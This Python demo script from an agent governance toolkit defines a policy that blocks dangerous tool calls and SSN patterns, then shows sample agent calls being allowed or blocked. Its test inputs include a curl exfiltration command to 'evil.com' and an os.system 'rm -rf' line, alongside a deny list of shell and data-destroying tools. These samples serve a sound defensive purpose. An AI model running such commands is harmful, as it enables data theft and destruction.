# Copyright (c) Microsoft Corporation.
# Licensed under the MIT License.
"""Demo 5: Add Governance to Any Agent - 3 Lines of Code.

MVP PGI - Agent Governance Toolkit
Uses real AGT PolicyEvaluator with a real policy to intercept calls.
"""
import sys

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8")

from agent_os.policies import PolicyEvaluator
from agent_os.policies.schema import (
    PolicyDocument, PolicyRule, PolicyCondition,
    PolicyAction, PolicyOperator, PolicyDefaults,
)

G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; C = "\033[96m"
B = "\033[1m"; D = "\033[2m"; X = "\033[0m"
DASH = "\u2501"


def section(t):
    print(f"\n{Y}{B}{DASH*3} {t} {DASH*(56-len(t))}{X}\n")


section("Step 1: Define a Governance Policy")

policy = PolicyDocument(
    name="contoso-agent-policy",
    version="1.0",
    description="Production safety rules for any Contoso AI agent",
    defaults=PolicyDefaults(action=PolicyAction.ALLOW),
    rules=[
        PolicyRule(
            name="block-dangerous-tools",
            condition=PolicyCondition(
                field="tool_name",
                operator=PolicyOperator.IN,
                value=["delete_file", "shell_exec", "execute_code", "drop_table", "transfer_funds"],
            ),
            action=PolicyAction.DENY,
            message="Dangerous tool blocked by governance policy",
            priority=100,
        ),
        PolicyRule(
            name="block-pii-exfiltration",
            condition=PolicyCondition(
                field="input_text",
                operator=PolicyOperator.MATCHES,
                value=r"\b\d{3}-\d{2}-\d{4}\b",
            ),
            action=PolicyAction.DENY,
            message="SSN pattern detected - data exfiltration blocked",
            priority=90,
        ),
    ],
)

evaluator = PolicyEvaluator(policies=[policy])
print(f"  Policy: {B}{policy.name}{X}")
print(f"  Rules:  {len(policy.rules)} loaded")
print(f"  Default: ALLOW (block only what matches)")

section("Step 2: Before vs After (The 3-Line Change)")

print(f"{D}  BEFORE (no governance):{X}")
print(f"{D}  +---------------------------------------------------+{X}")
print(f"{D}  | def handle_tool(name, args):                      |{X}")
print(f"{D}  |     return execute_tool(name, args)  # No check   |{X}")
print(f"{D}  +---------------------------------------------------+{X}")
print()
print(f"{G}  AFTER (with AGT governance):{X}")
print(f"{G}  +---------------------------------------------------+{X}")
print(f"{G}  | from agent_os.policies import PolicyEvaluator     | {Y}# Line 1{X}")
print(f"{G}  | evaluator = PolicyEvaluator()                     | {Y}# Line 2{X}")
print(f"{G}  | evaluator.load_policies('policies/')              | {Y}# Line 3{X}")
print(f"{G}  |                                                   |{X}")
print(f"{G}  | def handle_tool(name, args):                      |{X}")
print(f"{G}  |     r = evaluator.evaluate({{'tool_name': name}})   |{X}")
print(f"{G}  |     if not r.allowed:                             |{X}")
print(f"{G}  |         return f'BLOCKED: {{r.reason}}'             |{X}")
print(f"{G}  |     return execute_tool(name, args)               |{X}")
print(f"{G}  +---------------------------------------------------+{X}")

section("Step 3: Live Enforcement (Same Policy, Different Frameworks)")

scenarios = [
    ("OpenAI Agents SDK", "credit-check-agent", [
        ("check_credit",  "score for customer 12345",      True),
        ("transfer_funds", "move 50K to external account",  False),
    ]),
    ("LangChain", "research-agent", [
        ("web_search",  "latest AI governance papers",   True),
        ("shell_exec",  "curl http://evil.com/exfil",    False),
    ]),
    ("Semantic Kernel", "customer-service-bot", [
        ("summarize",     "summarize support ticket 4521",  True),
        ("execute_code",  "import os; os.system('rm -rf')", False),
    ]),
    ("CrewAI", "data-analyst", [
        ("read_file",  "quarterly-report.csv",      True),
        ("web_search", "lookup SSN 123-45-6789",    False),
    ]),
]

hdr = f"  {B}{'Framework':<22} {'Tool':<18} {'Result':<10} {'Reason'}{X}"
print(hdr)
print(f"  {'_' * 75}")

allowed = 0
blocked = 0
for framework, agent, tools in scenarios:
    for tool, input_text, expect in tools:
        ctx = dict(tool_name=tool, input_text=input_text, agent_id=agent)
        result = evaluator.evaluate(ctx)
        icon = f"{G}\u2713{X}" if result.allowed else f"{R}\u2717{X}"
        status = f"{G}ALLOWED{X}" if result.allowed else f"{R}BLOCKED{X}"
        reason = "" if result.allowed else result.reason[:40]
        print(f"  {icon} {framework:<22} {tool:<18} {status}  {D}{reason}{X}")
        if result.allowed:
            allowed += 1
        else:
            blocked += 1

print(f"\n  {G}\u2713 {allowed} allowed{X}  |  {R}\u2717 {blocked} blocked{X}  |  Policy violations reaching execution: {B}0{X}")
print(f"  {Y}Same YAML policy file. Same engine. Any framework.{X}")

section("Step 4: Install Commands")
cmds = [
    ("Python",     "pip install agent-governance-toolkit[full]"),
    ("TypeScript", "npm install @microsoft/agent-governance-sdk"),
    (".NET",       "dotnet add package Microsoft.AgentGovernance"),
    ("Rust",       "cargo add agentmesh"),
]
for lang, cmd in cmds:
    print(f"  {B}{lang:<12}{X} {D}{cmd}{X}")
